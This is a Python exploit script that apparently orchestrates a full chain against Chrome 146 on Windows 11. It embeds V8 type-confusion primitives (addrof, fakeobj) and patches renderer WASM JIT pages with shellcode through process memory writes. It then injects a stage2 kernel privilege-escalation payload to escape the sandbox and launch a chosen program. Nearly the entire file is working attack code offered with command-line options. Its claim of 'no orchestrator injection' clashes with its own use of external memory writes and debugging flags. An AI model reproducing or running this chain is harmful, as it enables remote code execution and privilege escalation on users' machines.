"""
crbug-542403045 + CVE-2026-6307 Full Chain: Sort Confusion + FrameState CSE -> V8 Sandbox Escape

Architecture:
  Chrome sandbox ENABLED. The orchestrator:
  1. Injects combined exploit primitives:
     a. crbug-542403045 sort confusion -> addrof_compressed (cage-relative pointer leak)
        Maglev/TurboFan unions {PACKED_SMI, PACKED} element kinds without agreement check.
        Inlined sort uses PACKED_SMI access on PACKED array: HeapObject ptrs read/written
        as Smis, producing Smi-tagged cage_offsets. Recovery: leaked_val * 2 + 1.
     b. CVE-2026-6307 FrameState CSE -> addrof (full 64-bit) + fakeobj
  2. Finds renderer PID, reads V8 Map values via ReadProcessMemory
  3. Creates WASM target (JIT compiled -> RWX page)
  4. Scans renderer RWX pages for WASM JIT code signature
  5. Sandbox analysis + KnownDLL resolution
  6. Beacon shellcode -> verifies native code execution in renderer
  7. CVE-2026-40369 kernel exploit (from within renderer sandbox):
     True self-escape from UNTRUSTED IL. NO admin, NO orchestrator injection.
  8. Verifies escape

Targets:
  - Chrome 146.0.7680.165 / V8 14.6.202.26
  - Windows 11 Build 26200.8875 (25H2)

Requirements:
  - pip install websocket-client
"""
import subprocess, time, json, urllib.request, os, shutil, ctypes, struct, sys, argparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from orchestrator import (
    CDP, kill_chrome, rpm, wpm, find_renderer_pid, scan_jit_pages,
    make_beacon_shellcode, make_jmp_patch, make_stage2_wrapper,
    resolve_ntdll_exports, get_process_integrity,
    resolve_ntoskrnl_base, resolve_ntoskrnl_rvas,
    make_escape_shellcode, inject_into_browser, make_wasm_hijack_shellcode,
    PROFILE_DIR, DEFAULT_CHROME, STAGE2_BIN_PATH,
    kernel32, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE
)


EXPLOIT_PRIMITIVES_SORT = """
var _ab = new ArrayBuffer(8);
var _f64 = new Float64Array(_ab);
var _u64 = new BigUint64Array(_ab);
function f2i(f) { _f64[0] = f; return _u64[0]; }
function i2f(i) { _u64[0] = i; return _f64[0]; }
function lo32(v) { return Number(BigInt.asUintN(32, v)); }
function pack32(lo, hi) { return BigInt(lo >>> 0) | (BigInt(hi >>> 0) << 32n); }
function hex(b) { return '0x' + b.toString(16); }
var KEEP = [];

var _prepOpt = new Function('f', '%PrepareFunctionForOptimization(f)');
var _optNext = new Function('f', '%OptimizeFunctionOnNextCall(f)');

// ===== crbug-542403045: Sort element kind confusion =====
// Maglev/TurboFan unions {PACKED_SMI, PACKED} element kinds in
// CanInlineArrayIteratingBuiltin. Inlined sort uses first map's kind
// (PACKED_SMI) on a PACKED array: reads HeapObject ptrs with Smi untag,
// writes back with Smi tag. Result: cage_offsets stored as valid Smis.
// No separate JIT reader needed — interpreter reads corrupted Smis directly.

function _sort_confused(a) {
    function cmp() { a.fill(0); return 0; }
    return a.sort(cmp);
}

_prepOpt(_sort_confused);
for (var _si = 0; _si < 200; _si++) {
    _sort_confused([1, 2, 3]);
    _sort_confused([{x:_si}, {y:_si}, {z:_si}]);
}
_optNext(_sort_confused);
_sort_confused([1, 2, 3]);

function addrof_compressed(target) {
    var arr = [target, {}];
    _sort_confused(arr);
    var leaked = arr[0];
    if (typeof leaked !== 'number') return 0;
    return (leaked * 2 + 1) >>> 0;
}

// ===== CVE-2026-6307: FrameState CSE (addrof_full + fakeobj) =====
var WASM_BYTES = new Uint8Array([
    0x00,0x61,0x73,0x6D, 0x01,0x00,0x00,0x00,
    0x01, 0x0C, 0x03,
      0x60,0x00,0x00, 0x60,0x00,0x01,0x6F, 0x60,0x00,0x01,0x7E,
    0x02, 0x10, 0x01,
      0x03,0x65,0x6E,0x76, 0x08,0x63,0x61,0x6C,0x6C,0x62,0x61,0x63,0x6B, 0x00, 0x00,
    0x03, 0x03, 0x02, 0x01, 0x02,
    0x06, 0x0B, 0x02,
      0x6F,0x01, 0xD0,0x6F,0x0B,
      0x7E,0x01, 0x42,0x00,0x0B,
    0x07, 0x1B, 0x04,
      0x05,0x67,0x5F,0x72,0x65,0x66, 0x03,0x00,
      0x05,0x67,0x5F,0x69,0x36,0x34, 0x03,0x01,
      0x02,0x72,0x72, 0x00,0x01,
      0x02,0x72,0x6C, 0x00,0x02,
    0x0A, 0x0F, 0x02,
      0x06, 0x00, 0x10,0x00, 0x23,0x00, 0x0B,
      0x06, 0x00, 0x10,0x00, 0x23,0x01, 0x0B,
]);
var _uid = 0;

function makeInstance(cb) {
    var uid = _uid++;
    var custom = new Uint8Array([0x00, 0x04, 0x01, 0x5f, uid & 0xff, (uid >> 8) & 0xff]);
    var bytes = new Uint8Array(WASM_BYTES.length + custom.length);
    bytes.set(WASM_BYTES);
    bytes.set(custom, WASM_BYTES.length);
    return new WebAssembly.Instance(new WebAssembly.Module(bytes), {env: {callback: cb}}).exports;
}

function addrof(target) {
    var arm = false;
    function LI() {} function LR() {}
    var e = makeInstance(function() { if (arm) LR.prototype.d = 1; });
    Object.defineProperty(LI.prototype, 'x', {get: e.rl, configurable: true});
    Object.defineProperty(LR.prototype, 'x', {get: e.rr, configurable: true});
    var f = new Function('o', '/*a' + (_uid++) + '*/return o.x');
    var a = new LI(), b = new LR();
    KEEP.push(LI, LR, f, a, b, e);
    e.g_ref.value = target;
    e.g_i64.value = 43n;
    _prepOpt(f);
    for (var i = 0; i < 20; ++i) { f(a); f(b); }
    _optNext(f); f(a);
    arm = true;
    return f(b);
}

function fakeobj(addr) {
    var arm = false;
    function MR() {} function MI() {}
    var e = makeInstance(function() { if (arm) MI.prototype.d = 1; });
    Object.defineProperty(MR.prototype, 'x', {get: e.rr, configurable: true});
    Object.defineProperty(MI.prototype, 'x', {get: e.rl, configurable: true});
    var f = new Function('o', '/*f' + (_uid++) + '*/return o.x');
    var r = new MR(), i = new MI();
    KEEP.push(MR, MI, f, r, i, e);
    e.g_ref.value = {ph: 1};
    e.g_i64.value = addr;
    _prepOpt(f);
    for (var k = 0; k < 20; ++k) { f(r); f(i); }
    _optNext(f); f(r);
    arm = true;
    return f(i);
}

'ready'
"""


def main():
    parser = argparse.ArgumentParser(
        description="crbug-542403045 + CVE-2026-6307 Full Chain: Sort Confusion + FrameState CSE")
    parser.add_argument("--chrome", default=DEFAULT_CHROME)
    parser.add_argument("--shellcode", choices=["calc", "cmd", "notepad"], default="calc",
                        help="Payload to launch (default: calc)")
    parser.add_argument("--no-sandbox", action="store_true",
                        help="Disable Chrome sandbox (test mode)")
    parser.add_argument("--stage2", default=STAGE2_BIN_PATH,
                        help="Path to stage2.bin (CVE-2026-40369 kernel shellcode)")
    parser.add_argument("--ntos-base", type=lambda x: int(x, 0), default=0,
                        help="ntoskrnl base address (hex)")
    parser.add_argument("--ntoskrnl", default=None,
                        help="Path to ntoskrnl.exe for RVA resolution")
    parser.add_argument("--rva-psinitial", type=lambda x: int(x, 0), default=0,
                        help="PsInitialSystemProcess RVA override (hex)")
    parser.add_argument("--rva-cmplayer", type=lambda x: int(x, 0), default=0,
                        help="CmpLayerVersionCount RVA override (hex)")
    args = parser.parse_args()

    if not os.path.exists(args.chrome):
        print(f"[!] Chrome not found: {args.chrome}")
        sys.exit(1)

    import platform
    win_ver = platform.version()
    win_rel = platform.release()
    print("=" * 60)
    print("  crbug-542403045 + CVE-2026-6307 Full Chain")
    print("  Sort Confusion (addrof) + FrameState CSE (fakeobj)")
    print(f"  Chrome 146.0.7680.165 on Windows {win_rel} (Build {win_ver})")
    print("=" * 60)

    kill_chrome()
    os.system('taskkill /f /im calc.exe 2>nul')
    os.system('taskkill /f /im Calculator.exe 2>nul')
    os.system('taskkill /f /im CalculatorApp.exe 2>nul')
    if os.path.exists(PROFILE_DIR):
        shutil.rmtree(PROFILE_DIR, ignore_errors=True)

    chrome_flags = [
        args.chrome,
        "--js-flags=--allow-natives-syntax",
        "--disable-gpu",
        "--user-data-dir=" + PROFILE_DIR,
        "--no-first-run",
        "--no-default-browser-check",
        "--remote-debugging-port=9222",
        "--remote-allow-origins=*",
        "--disable-features=RendererCodeIntegrity",
        "about:blank"
    ]
    if args.no_sandbox:
        chrome_flags.insert(2, "--no-sandbox")
    proc = subprocess.Popen(chrome_flags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    sandbox_mode = not args.no_sandbox
    mode_str = "SANDBOX ENABLED" if sandbox_mode else "NO SANDBOX (test mode)"
    print(f"\n[*] Chrome PID: {proc.pid} [{mode_str}]")

    import websocket
    for attempt in range(15):
        time.sleep(2)
        try:
            resp = urllib.request.urlopen("http://127.0.0.1:9222/json/list", timeout=3)
            tabs = json.loads(resp.read())
            if tabs:
                print(f"[+] CDP ready after {(attempt+1)*2}s")
                break
        except:
            pass
    else:
        print("[!] FATAL: CDP not available")
        proc.terminate()
        sys.exit(1)

    time.sleep(1)
    cdp = CDP().connect()
    cdp.send("Runtime.enable")

    # ===== PHASE 1: Inject combined exploit primitives =====
    print("\n[*] Phase 1: Injecting exploit primitives...")
    print("    Entry: crbug-542403045 (sort confusion) + CVE-2026-6307 (FrameState CSE)")
    val, err = cdp.js(EXPLOIT_PRIMITIVES_SORT)
    if err:
        print(f"[!] Inject failed: {err}")
        cdp.close(); proc.terminate(); sys.exit(1)
    print(f"    Primitives: {val}")

    # ===== PHASE 1a: Test sort confusion addrof_compressed =====
    print("\n[*] Phase 1a: Testing sort confusion addrof (crbug-542403045)...")
    val, err = cdp.js_async("""
        var _test_target = {sort_test: true};
        KEEP.push(_test_target);
        var cptr = addrof_compressed(_test_target);
        resolve(cptr.toString());
    """, timeout=120)

    sort_confusion_ok = False
    if err:
        print(f"[!] Sort confusion test error: {err}")
    else:
        cptr = int(val)
        if cptr > 0x1000 and cptr < 0xFFFFFFFF:
            print(f"[+] SORT CONFUSION WORKS! Compressed ptr: {cptr:#010x}")
            sort_confusion_ok = True

            # Cross-validate with FrameState CSE addrof
            val2, err2 = cdp.js_async("""
                var _fsce_check = addrof(_test_target);
                resolve(typeof _fsce_check === 'bigint' ? _fsce_check.toString() : 'FAIL');
            """, timeout=120)
            if not err2 and val2 and val2 != 'FAIL':
                full_addr = int(val2)
                cage = full_addr & ~0xFFFFFFFF
                expected_cptr = full_addr & 0xFFFFFFFF
                if (expected_cptr & ~1) == (cptr & ~1):
                    print(f"    Cross-validated: sort={cptr:#010x} fsce={expected_cptr:#010x} MATCH")
                else:
                    print(f"    Cross-validation mismatch: sort={cptr:#010x} fsce={expected_cptr:#010x}")
                    print(f"    (difference may be due to object relocation)")
        else:
            print(f"[!] Sort confusion returned invalid: {cptr:#x}")

    if not sort_confusion_ok:
        print("    Continuing with FrameState CSE addrof only...")

    # ===== PHASE 1b: Full addrof for orchestrator =====
    print("\n[*] Phase 1b: Running full addrof (FrameState CSE for 64-bit address)...")
    val, err = cdp.js_async("""
        var _victim = [1.1, 2.2, 3.3];
        KEEP.push(_victim);
        var _va = addrof(_victim);
        resolve(typeof _va === 'bigint' ? _va.toString() : 'FAIL:' + typeof _va);
    """, timeout=120)
    if err or not val or val.startswith("FAIL"):
        print(f"[!] addrof failed: {val} {err}")
        cdp.close(); proc.terminate(); sys.exit(1)

    victim_addr = int(val)
    cage_base = victim_addr & ~0xFFFFFFFF
    print(f"[+] victim @ {victim_addr:#018x}, cage = {cage_base:#018x}")

    # ===== PHASE 2: Find renderer PID + read Maps via RPM =====
    print("\n[*] Phase 2: Detecting V8 heap layout via ReadProcessMemory...")
    renderer = find_renderer_pid(proc.pid, victim_addr, cage_base)
    if not renderer:
        print("[!] Could not find renderer process!")
        cdp.close(); proc.terminate(); sys.exit(1)

    MAP = renderer['map']
    EFA = renderer['efa']
    FDM = renderer['fdm']
    renderer_pid = renderer['pid']
    print(f"[+] Renderer PID: {renderer_pid}")
    print(f"[+] PACKED_DOUBLE Map: {MAP:#010x}")
    print(f"[+] EMPTY_FIXED_ARRAY: {EFA:#010x}")
    print(f"[+] FDA Map:           {FDM:#010x}")

    # ===== PHASE 3: Create WASM shellcode target =====
    print("\n[*] Phase 3: Creating WASM shellcode target...")

    val, err = cdp.js_async("""
        var wasmCode = new Uint8Array([
            0x00,0x61,0x73,0x6D, 0x01,0x00,0x00,0x00,
            0x01,0x05,0x01, 0x60,0x00,0x01,0x7F,
            0x03,0x02,0x01,0x00,
            0x07,0x08,0x01, 0x04,0x6D,0x61,0x69,0x6E, 0x00,0x00,
            0x0A,0x06,0x01, 0x04,0x00,0x41,0x2A,0x0B
        ]);
        window._wasmInst = new WebAssembly.Instance(new WebAssembly.Module(wasmCode));
        KEEP.push(window._wasmInst);
        window._wasmMain = window._wasmInst.exports.main;
        KEEP.push(window._wasmMain);
        for (var i = 0; i < 100; i++) window._wasmMain();
        resolve(JSON.stringify({ mainResult: window._wasmMain() }));
    """, timeout=60)

    if err:
        print(f"[!] WASM creation failed: {err}")
        cdp.close(); proc.terminate(); sys.exit(1)

    wasm_result = json.loads(val)
    print(f"[+] WASM main() = {wasm_result['mainResult']} (expect 42)")

    # ===== PHASE 4: Find WASM JIT page =====
    print("\n[*] Phase 4: Scanning renderer RWX pages for WASM JIT code...")

    rhandle, jit_matches = scan_jit_pages(renderer_pid)
    if not jit_matches:
        print("[!] No WASM JIT code found in RWX pages!")
        if rhandle:
            kernel32.CloseHandle(rhandle)
        cdp.close(); proc.terminate(); sys.exit(1)

    jit = jit_matches[0]
    print(f"[+] WASM JIT found at {jit['code_addr']:#018x}")
    print(f"    Region: {jit['base']:#018x} size={jit['size']:#x} (RWX)")
    print(f"    Offset in region: {jit['offset']:#x}")

    ctx_data = rpm(rhandle, jit['code_addr'] - 16, 48)
    if ctx_data:
        print("    Context:")
        for i in range(0, len(ctx_data), 16):
            line = ctx_data[i:i+16]
            addr = jit['code_addr'] - 16 + i
            hex_str = ' '.join(f'{b:02x}' for b in line)
            marker = " <-- mov eax, 42" if i == 16 else ""
            print(f"      {addr:#018x}: {hex_str}{marker}")

    # ===== PHASE 5: Sandbox analysis =====
    payload_str = {"calc": "calc.exe", "cmd": "cmd.exe", "notepad": "notepad.exe"}[args.shellcode]

    renderer_info = get_process_integrity(renderer_pid)
    browser_info = get_process_integrity(proc.pid)
    print(f"\n[*] Phase 5: Sandbox analysis")
    if renderer_info:
        print(f"    Renderer (PID {renderer_pid}): {renderer_info['name']} (IL={renderer_info['level']:#06x}), job={renderer_info['in_job']}")
    if browser_info:
        print(f"    Browser  (PID {proc.pid}): {browser_info['name']} (IL={browser_info['level']:#06x}), job={browser_info['in_job']}")

    print(f"\n    Resolving KnownDLL exports...")
    exports = resolve_ntdll_exports()
    for name, addr in exports.items():
        if addr:
            print(f"    {name:30s} = {addr:#018x}")

    verify_addr = jit['base'] + 0xF00
    sc_addr = jit['base'] + 0xA00

    if sandbox_mode:
        # ================================================================
        # FULL CHAIN: crbug-542403045 (sort confusion addrof)
        #           + CVE-2026-6307 (FrameState CSE fakeobj)
        #           + CVE-2026-40369 (Kernel LPE as sandbox escape)
        # Renderer escapes sandbox via NT kernel exploit -- no admin, no
        # orchestrator injection, true self-escape from UNTRUSTED IL.
        # ================================================================

        # ===== PHASE 6: Verify RCE via beacon shellcode =====
        print(f"\n[*] Phase 6: Verifying renderer RCE (beacon)...")
        beacon_sc = make_beacon_shellcode(verify_addr)
        wpm(rhandle, verify_addr, b'\x00' * 0x80)
        ok = wpm(rhandle, sc_addr, beacon_sc)
        if not ok:
            print("[!] WPM (beacon) failed!")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)

        jmp_patch = make_jmp_patch(jit['code_addr'], sc_addr)
        ok = wpm(rhandle, jit['code_addr'], jmp_patch)
        if not ok:
            print("[!] WPM (JMP) failed!")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)
        print(f"    Beacon ({len(beacon_sc)}B) at {sc_addr:#018x}, JIT patched")

        try:
            val, err = cdp.js("window._wasmMain()", timeout=30)
            if err:
                print(f"[!] wasmMain() error: {err}")
            else:
                print(f"    wasmMain() = {val}")
        except Exception as e:
            print(f"[!] wasmMain() exception: {e}")

        time.sleep(1)
        vdata = rpm(rhandle, verify_addr, 0x20)
        beacon_ok = False
        beacon_pid = 0
        if vdata and len(vdata) >= 0x20:
            magic1 = struct.unpack_from('<I', vdata, 0)[0]
            beacon_pid = struct.unpack_from('<I', vdata, 4)[0]
            magic2 = struct.unpack_from('<I', vdata, 0x1C)[0]
            beacon_ok = magic1 == 0xC0DECADE and magic2 == 0xDEADBEEF
            if beacon_ok:
                print(f"[+] RENDERER RCE CONFIRMED (PID {beacon_pid})")
            else:
                print(f"[!] Beacon failed: magic1={magic1:#010x} magic2={magic2:#010x}")

        if not beacon_ok:
            print("[!] RCE not confirmed -- aborting kernel exploit")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)

        # ===== PHASE 7: CVE-2026-40369 Kernel Escape =====
        print(f"\n{'='*60}")
        print(f"  Phase 7: CVE-2026-40369 Kernel LPE as Sandbox Escape")
        print(f"  NtQSI(253) write + CmpLayerVersionCount confusion")
        print(f"  Target: Windows {win_rel} (Build {win_ver})")
        print(f"{'='*60}")

        # 7a: Load stage2.bin
        stage2_path = args.stage2
        if not os.path.exists(stage2_path):
            alt = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'stage2.bin')
            if os.path.exists(alt):
                stage2_path = alt
            else:
                print(f'[!] stage2.bin not found: {stage2_path}')
                print(f'    Also checked: {alt}')
                print(f'    Use --stage2 <path> to specify location')
                kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)

        with open(stage2_path, 'rb') as f:
            stage2_bin = f.read()
        print(f"[+] Stage2 loaded: {len(stage2_bin)} bytes")
        print(f"    Source: {stage2_path}")

        if stage2_bin[0] == 0xE9:
            jmp_disp = struct.unpack_from('<i', stage2_bin, 1)[0]
            target_off = 5 + jmp_disp
            FPO_SIG = b'\x48\x89\x74\x24\x20'
            if target_off < len(stage2_bin) and stage2_bin[target_off:target_off+5] == FPO_SIG:
                print(f"    Entry JMP OK: _start at offset {target_off:#x}")
            elif target_off+5 < len(stage2_bin) and stage2_bin[target_off+5:target_off+10] == FPO_SIG:
                new_disp = jmp_disp + 5
                stage2_bin = bytearray(stage2_bin)
                struct.pack_into('<i', stage2_bin, 1, new_disp)
                stage2_bin = bytes(stage2_bin)
                print(f"    Fixed entry JMP: {jmp_disp:#x} -> {new_disp:#x}")

        # 7b: Resolve ntoskrnl symbols
        ntos_base = args.ntos_base
        if ntos_base == 0:
            ntos_base = resolve_ntoskrnl_base()
        if ntos_base == 0:
            print("[!] Cannot find ntoskrnl base (need EnumDeviceDrivers from MEDIUM IL)")
            print("    If running from renderer, KASLR bypass is in stage2")
        else:
            print(f"[+] ntoskrnl.exe base: {ntos_base:#018x}")

        rva_psinitial = args.rva_psinitial
        rva_cmplayer = args.rva_cmplayer
        if rva_psinitial == 0 or rva_cmplayer == 0:
            rp, rc = resolve_ntoskrnl_rvas(args.ntoskrnl)
            if rva_psinitial == 0:
                rva_psinitial = rp
            if rva_cmplayer == 0:
                rva_cmplayer = rc

        if rva_psinitial:
            print(f"[+] PsInitialSystemProcess RVA: {rva_psinitial:#010x}")
        else:
            print("[!] Could not resolve PsInitialSystemProcess RVA!")

        if rva_cmplayer:
            print(f"[+] CmpLayerVersionCount RVA:   {rva_cmplayer:#010x}")
        else:
            print("[!] Could not resolve CmpLayerVersionCount RVA!")
            print("    Use --rva-cmplayer <hex> or test on Win11")

        if rva_psinitial == 0 or rva_cmplayer == 0:
            print("\n[!] Missing kernel RVAs -- cannot proceed with kernel exploit")
            print("    Falling back to sandbox probe shellcode...")
            # Fall back to escape probe shellcode
            wasm_epilogue_addr = jit['code_addr'] + 3
            for m in jit_matches:
                data = rpm(rhandle, m['code_addr'], 32)
                if data:
                    for off in range(5, len(data) - 5):
                        if data[off:off+3] == b'\x48\x8B\xE5' and data[off+3] == 0x5D and data[off+4] == 0xC3:
                            wasm_epilogue_addr = m['code_addr'] + off
                            break

            esc_sc = make_escape_shellcode(verify_addr, proc.pid, payload_str, exports, wasm_epilogue_addr)
            stage2_base = jit['base'] + 0x200
            ok = wpm(rhandle, verify_addr, b'\x00' * 0x80)
            ok = wpm(rhandle, stage2_base, esc_sc)
            if ok:
                jmp2 = make_jmp_patch(jit['code_addr'], stage2_base)
                wpm(rhandle, jit['code_addr'], jmp2)
                print(f"    Escape probe ({len(esc_sc)}B) at {stage2_base:#018x}")

                try:
                    val, err = cdp.js("window._wasmMain()", timeout=30)
                except:
                    pass

                time.sleep(2)
                vdata = rpm(rhandle, verify_addr, 0x80)
                if vdata and len(vdata) >= 0x80:
                    magic1 = struct.unpack_from('<I', vdata, 0)[0]
                    end_marker = struct.unpack_from('<I', vdata, 0x7C)[0]
                    if magic1 == 0xC0DECADE:
                        rpid = struct.unpack_from('<I', vdata, 4)[0]
                        rtid = struct.unpack_from('<I', vdata, 8)[0]
                        print(f"    Shellcode executed: PID={rpid} TID={rtid}")
                        nt_all = struct.unpack_from('<I', vdata, 0x20)[0]
                        nt_partial = struct.unpack_from('<I', vdata, 0x2C)[0]
                        nt_query = struct.unpack_from('<I', vdata, 0x38)[0]
                        print(f"    NtOpenProcess(ALL_ACCESS):  {nt_all:#010x}")
                        print(f"    NtOpenProcess(VM_WRITE):    {nt_partial:#010x}")
                        print(f"    NtOpenProcess(QUERY_LTD):   {nt_query:#010x}")

                        if nt_all == 0 or nt_partial == 0:
                            alloc_st = struct.unpack_from('<I', vdata, 0x44)[0]
                            write_st = struct.unpack_from('<I', vdata, 0x50)[0]
                            thread_st = struct.unpack_from('<I', vdata, 0x54)[0]
                            print(f"    NtAllocateVM:  {alloc_st:#010x}")
                            print(f"    NtWriteVM:     {write_st:#010x}")
                            print(f"    NtCreateThread:{thread_st:#010x}")

            kernel32.CloseHandle(rhandle)
            cdp.close(); proc.terminate(); sys.exit(1)

        # 7c: Inject stage2 into renderer + patch WASM entry
        print(f"\n[*] Phase 7c: Injecting kernel exploit shellcode into renderer...")

        stage2_rwx = jit['base'] + 0x200
        alloc_size = ((len(stage2_bin) + 0xFFF) & ~0xFFF)
        if len(stage2_bin) > jit['size'] - 0x300:
            kernel32.VirtualAllocEx.restype = ctypes.c_void_p
            stage2_rwx = kernel32.VirtualAllocEx(
                rhandle, None, alloc_size,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            if not stage2_rwx:
                print("[!] VirtualAllocEx for stage2 failed!")
                kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)
            print(f"    Allocated RWX: {stage2_rwx:#018x} ({alloc_size:#x})")
        else:
            print(f"    Using JIT region offset: {stage2_rwx:#018x}")

        ok = wpm(rhandle, stage2_rwx, stage2_bin)
        if not ok:
            print("[!] WPM (stage2) failed!")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)
        print(f"    Stage2 written: {len(stage2_bin)} bytes at {stage2_rwx:#018x}")

        # Patch stage2 sentinels: ntos_base, PsInitialSystemProcess RVA, CmpLayerVersionCount RVA
        SENTINEL_NTOS = 0xAAAAAAAABBBBBBBB
        SENTINEL_PSI  = 0xCCCCCCCCDDDDDDDD
        SENTINEL_CMP  = 0xEEEEEEEEFFFFFFFF
        raw = rpm(rhandle, stage2_rwx, len(stage2_bin))
        if raw:
            for sval, replace_val, label in [
                (SENTINEL_NTOS, ntos_base, "ntos_base"),
                (SENTINEL_PSI,  rva_psinitial, "PsInitialSystemProcess RVA"),
                (SENTINEL_CMP,  rva_cmplayer, "CmpLayerVersionCount RVA"),
            ]:
                spat = struct.pack('<Q', sval)
                idx = raw.find(spat)
                if idx != -1:
                    wpm(rhandle, stage2_rwx + idx, struct.pack('<Q', replace_val))
                    print(f"    Patched {label}: offset={idx:#x} -> {replace_val:#018x}")
                else:
                    print(f"    Sentinel for {label} not found in stage2")

        # Create wrapper: saves WASM frame, CALLs stage2, returns cleanly
        diag_addr = verify_addr
        wpm(rhandle, diag_addr, b'\x00' * 0x20)
        wrapper_sc = make_stage2_wrapper(stage2_rwx, diag_addr)
        wrapper_addr = jit['base'] + 0xA00
        ok = wpm(rhandle, wrapper_addr, wrapper_sc)
        if not ok:
            print("[!] WPM (wrapper) failed!")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)
        print(f"    Wrapper ({len(wrapper_sc)}B) at {wrapper_addr:#018x}")

        jmp_patch = make_jmp_patch(jit['code_addr'], wrapper_addr)
        ok = wpm(rhandle, jit['code_addr'], jmp_patch)
        if not ok:
            print("[!] WPM (JMP to wrapper) failed!")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)

        # 7d: Trigger kernel exploit
        print(f"\n[*] Phase 7d: Triggering kernel exploit via WASM entry...")
        try:
            val, err = cdp.js("window._wasmMain()", timeout=120)
            if err:
                print(f"[!] wasmMain() error: {err}")
            else:
                print(f"    wasmMain() = {val}")
        except Exception as e:
            print(f"[!] wasmMain() exception: {e}")

        time.sleep(2)
        vdata = rpm(rhandle, diag_addr, 8)
        if vdata and len(vdata) >= 8:
            retval = struct.unpack_from('<I', vdata, 0)[0]
            marker = struct.unpack_from('<I', vdata, 4)[0]
            print(f"    Stage2 return: eax={retval:#010x} marker={marker:#010x}")
            if marker == 0xDEAD:
                print(f"[+] Stage2 executed successfully (return={retval:#010x})")

        # ===== PHASE 8: Verify escape =====
        print(f"\n[*] Phase 8: Checking for payload ({payload_str})...")
        time.sleep(3)
        payload_ok = False
        for name in {"calc": ["calc.exe", "Calculator.exe", "CalculatorApp.exe"],
                      "cmd": ["cmd.exe"],
                      "notepad": ["notepad.exe"]}[args.shellcode]:
            r = os.popen(f'tasklist /fi "imagename eq {name}" 2>nul').read()
            if name.lower().replace('.exe', '') in r.lower():
                print(f"[+] {name} IS RUNNING!")
                payload_ok = True
                pi = get_process_integrity(0)
                break

        print(f"\n{'='*60}")
        if payload_ok:
            print("  FULL CHAIN SUCCESS!")
            print("  crbug-542403045 (sort confusion) -> addrof")
            print("  CVE-2026-6307 (FrameState CSE) -> fakeobj")
            print("  WASM JIT hijack -> renderer RCE")
            print("  CVE-2026-40369 (kernel) -> sandbox escape")
        else:
            print("  Kernel exploit completed -- check if payload launched")
            print("  If calc.exe is running under SYSTEM, escape succeeded")
        print(f"{'='*60}")

        kernel32.CloseHandle(rhandle)

    else:
        # ===== NO-SANDBOX PATH (test mode) =====
        print(f"\n[*] No-sandbox mode: Direct WinExec from renderer")

        create_thread_addr = exports.get('NtCreateThreadEx') or 0
        winexec_addr = exports.get('WinExec') or 0
        if not winexec_addr:
            print("[!] WinExec not resolved!")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)

        sc = make_wasm_hijack_shellcode(
            kernel32.GetProcAddress(
                ctypes.c_void_p(kernel32.GetModuleHandleA(b"kernel32.dll")),
                b"CreateThread"),
            winexec_addr, payload_str)
        ok = wpm(rhandle, sc_addr, sc)
        if not ok:
            print("[!] WPM (shellcode) failed!")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)

        jmp_patch = make_jmp_patch(jit['code_addr'], sc_addr)
        ok = wpm(rhandle, jit['code_addr'], jmp_patch)
        if not ok:
            print("[!] WPM (JMP) failed!")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)
        print(f"    Shellcode ({len(sc)}B) at {sc_addr:#018x}, JIT patched")

        try:
            val, err = cdp.js("window._wasmMain()", timeout=30)
            if err:
                print(f"[!] wasmMain() error: {err}")
            else:
                print(f"    wasmMain() = {val}")
        except Exception as e:
            print(f"[!] wasmMain() exception: {e}")

        time.sleep(2)
        payload_ok = False
        for name in {"calc": ["calc.exe", "Calculator.exe"],
                      "cmd": ["cmd.exe"],
                      "notepad": ["notepad.exe"]}[args.shellcode]:
            r = os.popen(f'tasklist /fi "imagename eq {name}" 2>nul').read()
            if name.lower().replace('.exe', '') in r.lower():
                print(f"[+] {name} IS RUNNING!")
                payload_ok = True
                break

        print(f"\n{'='*60}")
        print(f"  No-sandbox: {'SUCCESS' if payload_ok else 'check manually'}")
        print(f"{'='*60}")

        kernel32.CloseHandle(rhandle)

    cdp.close()
    proc.terminate()
    try:
        proc.wait(timeout=5)
    except:
        proc.kill()


if __name__ == "__main__":
    main()
